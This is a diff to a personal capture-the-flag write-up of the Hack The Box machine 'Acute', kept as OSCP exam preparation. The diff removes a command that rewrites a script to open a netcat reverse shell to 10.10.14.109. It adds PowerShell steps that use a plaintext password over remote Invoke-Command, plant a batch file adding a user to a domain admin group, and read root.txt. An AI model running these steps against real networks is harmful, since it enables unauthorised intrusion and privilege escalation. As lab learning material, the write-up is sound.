@@ -1,7 +1,7 @@
 # Acute Helped-Through
 
 Name: Acute
-Date:  
+Date:  29/11/2022
 Difficulty: Hard  
 Goals:  OSCP prep and rebuild alot of lost momentuum before December
 Learnt:
@@ -10,6 +10,7 @@ Learnt:
 - Be throughout - 2/4 - I wanted to test links to much! - Extract all and Test Linearly - Extract and Test.
 - Limited powershell `get-command -> get-alias`
 - Password reuse, password reuse
+- Weird Admin scripts exist in real life, Uber 2022
 
 Had a pretty terrible couple of days, awhile still being healthy and solved some more administrative issues. No boxes were done and I am returningto power through the next exam like 12 hours brutality fun-time-fail-and-fix. One day in one day off. I need a good five hours of fun and practical learning and recall. These streams are great for that as Al is always either two steps ahead of me or I am ahead by a step whiel he is using the other half of his brain to throw out questions, testing the audience and answering questions about relevant cyber security questions.
 [Alh4zr3d](https://www.youtube.com/watch?v=IRSm7kalGPY) stream and after following along I will read 0xDF writeup on this and another from another source.
@@ -305,21 +306,28 @@ The script that triggered Al
 Always Check custom administrator groups; callback to the Word.doc
 ![](customadmingroups.png)
 
-
-
+Returning to finish this box.
 ```powershell
 $pass = ConvertTo-SecureString "Password@123" -AsPlainText -Force
 $cred = New-Object System.Management.Automation.PSCredential("ACUTE\awallace", $pass)
-
-
 Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred -ScriptBlock { whoami } 
-
-
-
-Invoke-Command -ScriptBlock { ((cat ..\desktop\wm.ps1 -Raw) -replace 'Get-Volume', 'C:\utils\nc.exe -e cmd 10.10.14.109 8890') | sc -Path C:\ } -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred
-
-
-Invoke-Command -ScriptBlock { C:\users\imonks\desktop\wm.ps1 } -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred
 ```
 
 ![](acuteawallace.png)
+
+```powershell
+Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred -ScriptBlock { cat 'C:\program files\keepmeon\keepmeon.bat'
+```
+
+It is really weird script to run all batch scripts.
+![](secondscript.png)
+
+```powershell
+# In honour of finishing this to move on and embedded the lessons into my notes and checklists
+Invoke-Command -ScriptBlock { Set-Content -Path 'c:\program files\keepmeon\0xdf.bat' -Value 'net group site_admin awallace /add /domain'} -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred
+
+Invoke-Command -ScriptBlock { cat '\program files\keepmeon\0xdf.bat' } -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred
+net group site_admin awallace /add /domain
+# Root.tx is readable
+Invoke-Command -ScriptBlock { cat c:\users\administrator\desktop\root.txt  } -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred
+```
